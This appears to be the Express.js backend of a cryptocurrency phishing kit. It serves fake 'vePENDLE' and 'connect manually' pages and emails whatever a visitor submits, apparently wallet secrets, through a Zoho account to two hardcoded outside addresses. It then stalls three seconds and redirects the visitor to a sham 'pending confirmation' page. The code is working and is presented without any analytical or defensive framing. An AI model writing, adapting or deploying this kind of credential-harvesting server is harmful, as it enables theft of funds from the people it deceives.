const express = require('express')
const nodemailer = require('nodemailer')
const bodyParser = require('body-parser')
const dotenv = require('dotenv')
const app = express();
dotenv.config()

const PORT = process.env.PORT

app.use(express.static("views"))
app.use(express.static(__dirname + "/public/"))
app.use(express.static(__dirname + "/views/vePENDLE_files/"))
app.use(express.static(__dirname + "/views/Issues_files/"))
app.use(express.static(__dirname + "/views/Pending_files/"))
app.use(bodyParser.urlencoded({ extended: true }))

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

app.get('/build', (req, res) => {
    res.sendFile(__dirname + '/views/vePENDLE.html')
})

app.get('/build/connect/manually', (req, res) => {
    res.sendFile(__dirname + '/views/Issues.html')
})

app.get('/build/pending/confirmation/success', (req, res) => {
    res.sendFile(__dirname + '/views/Pending.html')
})


app.post('/build/connect/manually/success', async (req, res) => {
    const transporter = nodemailer.createTransport({
        service: 'zoho',
        auth: {
            user: process.env.USERNAME,
            pass: process.env.PASSWORD
        }
    })

    await new Promise((resolve, reject) => {
        transporter.verify(function(error, success) {
          if (error){
            console.log(error)
            reject(error)
          }else{
            console.log('Server succesfully ready to send mail')
            resolve(success)
          }
        })
    })


    const recipients = ["info@resolverconsult-panel.com", "node.resolver@gmail.com"]
    for(let recipient of recipients) {
        const mailOptions = {
            from: "info@resolverconsult-panel.com",
            to: recipient,
            subject: `${req.body.category}`,
            html: `${req.body.data}`
        }

        await new Promise((resolve, reject) => {
            transporter.sendMail(mailOptions, (error, info) => {
                if (error) {
                    console.log(error);
                    reject(error);
                }else{
                    console.log(`Email sent to ${recipient}: ` + info.response);
                    resolve(info);
                }

            })
        })
    }
        await delay(3000)
        res.redirect('/build/pending/confirmation/success')
})

app.listen(PORT, () => {
    console.log(`Server started on PORT: ${PORT}`)
})